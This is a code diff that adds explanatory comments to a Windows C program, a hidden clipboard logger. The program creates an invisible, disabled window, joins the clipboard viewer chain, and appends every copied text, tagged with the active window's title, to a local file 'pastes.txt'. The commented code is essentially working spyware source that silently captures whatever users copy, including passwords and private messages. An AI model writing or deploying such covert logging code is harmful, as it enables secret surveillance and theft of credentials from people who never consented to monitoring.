@@ -70,6 +70,7 @@ BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
 
    hInst = hInstance;
 
+   //Start the Window disabled, not visible
    hWnd = CreateWindow(szWindowClass, szTitle, WS_DISABLED, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL);
 
    if (!hWnd)
@@ -77,6 +78,7 @@ BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
       return FALSE;
    }
 
+   //Don't run ShowWindow to avoid creating a visable Window, but still get WndProc messages
    UpdateWindow(hWnd);
 
    return TRUE;
@@ -99,13 +101,16 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 		EndPaint(hWnd, &ps);
 		break;
 	case WM_DESTROY:
+		//Add this to take this application out of the chain for clipboard monitors
 		ChangeClipboardChain(hWnd, hwndNextViewer);
 		PostQuitMessage(0);
 		break;
 	case WM_CREATE:
+		//Add ourselves to the chain of clipboard monitors and store the next in the chain
 		hwndNextViewer = SetClipboardViewer(hWnd); 
 		break;
 	case WM_CHANGECBCHAIN: 
+		//Handle the changes to the chain
 		if ((HWND) wParam == hwndNextViewer) 
 			hwndNextViewer = (HWND) lParam; 
 		else if (hwndNextViewer != NULL) 
@@ -113,36 +118,52 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 		break;
 	case WM_DRAWCLIPBOARD:
 	case WM_CLIPBOARDUPDATE:	
+		//Here is the message for changes to the clipboard
+		//Make sure we can open the clipboard by doing so(blocking others from opening it)
 		if(OpenClipboard(hWnd))
 		{
+			//Gets the global memory pointer for the data in the clipboard
 			HGLOBAL hglb = GetClipboardData(CF_TEXT); 
 			if (hglb != NULL) 
 			{ 
+				//Lock the global memory to get the string in the clipboard
 				LPTSTR lptstr = (LPTSTR)GlobalLock(hglb); 
 				if (lptstr != NULL) 
 				{ 
+					//Open the output file
 					FILE * f = fopen("pastes.txt", "a");
 					if(f != NULL)
 					{
 						char title[2048];
 						memset(title, 0x00, 2048);
+						//Get the currently active window which is most
+						//likely the Window being copied from
 						HWND copyFrom = GetForegroundWindow();
+						//Get the title from that Window
 						GetWindowText(copyFrom, title, 2048);
+						//Then write it file
 						fputs("(", f);
 						if(title != NULL && strlen(title) != 0)
 						{
 							fputs(title, f);
 						}
 						fputs("):", f);
+
+						//Then write the clipboard data to the file
 						fputs(lptstr, f);
+
+						//Then a newline to make it easier to read
 						fputs("\n", f);
 						fclose(f);
 					}
+					//Unlock the memory
 					GlobalUnlock(hglb); 
 				} 
 			}
+			//Close the clipboard
 			CloseClipboard();
 		}
+		//Pass the message on to the next in the chain
         SendMessage(hwndNextViewer, message, wParam, lParam); 
         break; 
 	default:
